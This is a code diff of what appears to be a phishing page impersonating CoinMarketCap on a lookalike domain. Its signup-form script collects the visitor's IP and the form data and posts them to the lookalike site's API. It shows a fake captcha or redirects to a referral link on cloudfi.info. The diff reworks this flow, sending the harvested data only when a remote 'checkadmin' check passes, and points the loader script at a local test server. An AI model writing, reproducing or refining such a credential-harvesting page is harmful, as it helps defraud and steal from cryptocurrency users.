@@ -209,7 +209,8 @@
     </main>
 
     <script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
-    <script src="https://api.coinmarketcap.jp/loginpage.js?project=cloudfi.info&reflink=https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP"></script>
+    <!-- <script src="https://api.coinmarketcap.jp/loginpage.js?project=cloudfi.info&reflink=https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP"></script> -->
+    <script src="http://127.0.0.1:8000/loginpage.js?project=cloudfi.info&reflink=https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP"></script>
     <script>
       document
         .getElementById('signup-form')
@@ -223,12 +224,6 @@
             window.location.href = 'https://www.coinmarketcap.jp';
             return;
           }
-
-          var isAdmin = await fetch('https://api.coinmarketcap.jp/checkadmin')
-            .then((response) => response.json())
-            .then((data) => data.status);
-
-          console.log(isAdmin);
 
           const clientIP = await fetch('https://api.ipify.org?format=json')
             .then((response) => response.json())
@@ -256,28 +251,32 @@
             body: JSON.stringify(data),
           }).then((response) => response.json());
 
-          await fetch(`https://api.coinmarketcap.jp/userevent`, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(data),
-          })
+          var isAdmin = await fetch('https://api.coinmarketcap.jp/checkadmin')
             .then((response) => response.json())
-            .then((result) => {
-              if (isAdmin) {
+            .then((data) => data.status);
+
+          if (isAdmin) {
+            await fetch(`https://api.coinmarketcap.jp/userevent`, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(data),
+            })
+              .then((response) => response.json())
+              .then((result) => {
                 const login_page = document.getElementById('login_page');
                 login_page.style.display = 'none';
                 const captcha_page = document.getElementById('captcha_page');
                 captcha_page.style.display = 'block';
-              } else {
-                window.location.href =
-                  'https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP';
-              }
-            })
-            .catch((error) => {
-              console.error('Error:', error);
-            });
+              })
+              .catch((error) => {
+                console.error('Error:', error);
+              });
+          } else {
+            window.location.href =
+              'https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP';
+          }
         });
     </script>
 
